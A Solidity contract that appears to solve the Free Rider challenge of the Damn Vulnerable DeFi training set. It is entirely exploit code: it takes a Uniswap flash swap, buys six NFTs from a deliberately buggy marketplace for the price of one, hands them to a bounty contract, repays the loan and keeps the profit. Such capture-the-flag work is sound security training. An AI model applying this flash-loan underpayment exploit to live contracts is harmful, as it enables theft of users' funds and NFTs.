// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

contract FreeRiderAttacker is IUniswapV2Callee {

    using Address for address;

    address private attacker;

    DamnValuableToken private token;
    DamnValuableNFT private nft;

    FreeRiderNFTMarketplace private marketplace;
    FreeRiderBuyer private buyer;

    IUniswapV2Factory private factory;
    IUniswapV2Pair private pair;
    IWETH private weth;

    constructor(address payable marketplaceAddr, address buyerAddr, address factoryAddr, address wethAddr, address dvtAddr, address nftAddr) {
        attacker = msg.sender;
        marketplace = FreeRiderNFTMarketplace(marketplaceAddr);
        buyer = FreeRiderBuyer(buyerAddr);
        factory = IUniswapV2Factory(factoryAddr);
        weth = IWETH(wethAddr);
        token = DamnValuableToken(dvtAddr);
        nft = DamnValuableNFT(nftAddr);
        pair = IUniswapV2Pair(factory.getPair(wethAddr, dvtAddr));
    }

    function attack() external payable {
        bytes memory data = " ";
        pair.swap(15 ether, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) override external {
        weth.withdraw(15 ether);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenId);
        }

        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

        payable(attacker).transfer(address(this).balance);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable {
    }
}
